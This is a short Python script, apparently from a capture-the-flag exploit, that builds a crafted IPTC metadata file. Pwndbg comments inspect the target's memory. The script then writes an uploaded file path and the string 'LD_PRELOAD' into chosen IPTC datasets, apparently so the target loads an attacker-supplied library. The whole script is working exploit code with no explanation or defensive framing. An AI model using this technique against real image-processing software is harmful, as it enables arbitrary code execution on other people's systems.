#!/usr/bin/env python3

import sys
import struct

iptc = sys.argv[1]
ticket = sys.argv[2]

# Create a IPTC file

# pwndbg> p (*((char*(*) [10][256]) 0x7ffff75359a0))[9][14]
# $60 = 0x5597f00dab0a "Example Writer"
# pwndbg> p (*(char*(*) [10][256])0x7ffd741bac70)[9][23]
# $6 = 0x55ccf72352a2 "%hhx, dataset=%hhu:%02hhu, size=%hu, data=%.*s\n"
#
# - Last IPTC entry has to be value "LD_PRELOAD"
# - iptc[9][14] must be the "Image" RGB value

upload_path = f"/tmp/snow_globe/intermediate_results/{ticket}.rgb"
tag = 0x1c
with open(iptc, "wb") as f:
    dat = struct.pack(">BBBH", tag, 0x09, 0x0e, len(upload_path)) + upload_path.encode()
    f.write(dat)

    dat = struct.pack(">BBBH", tag, 0x09, 0x17, len("LD_PRELOAD")) + b"LD_PRELOAD"
    f.write(dat)
